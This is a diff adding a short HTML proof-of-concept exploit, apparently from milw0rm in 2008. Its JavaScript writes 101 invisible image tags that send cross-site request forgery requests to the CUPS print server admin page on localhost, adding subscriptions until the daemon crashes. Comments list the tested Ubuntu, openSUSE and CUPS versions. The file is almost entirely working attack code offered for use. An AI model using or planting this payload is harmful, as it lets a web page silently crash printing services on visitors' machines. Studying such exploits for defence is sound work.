@@ -1,0 +1,26 @@
+<!-- cat cups_dos_poc.html  -->
+<script>
+// make 101 CSRFed requests to CUPS daemon via 'img' tags
+// causes CUPS daemon to crash
+// by Adrian 'pagvac' Pastor | GNUCITIZEN.org
+
+for(var i=1;i<=101;++i) {
+    document.write("<img width=0 height=0 " +
+        "src=\"http://localhost:631/admin/?OP=add-rss-subscription&SUBSCRIPTION_NAME=DOS_TEST_" +
+        i + "&PRINTER_URI=%23ALL%23&EVENT_JOB_CREATED=on&MAX_EVENTS=20\">");
+}
+
+/*
+TESTED ON:
+
+Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
+Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux
+
+openSUSE 11.0 (i586)
+Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux
+
+Common UNIX Printing System 1.3.7
+*/
+</script>
+
+# milw0rm.com [2008-11-18]
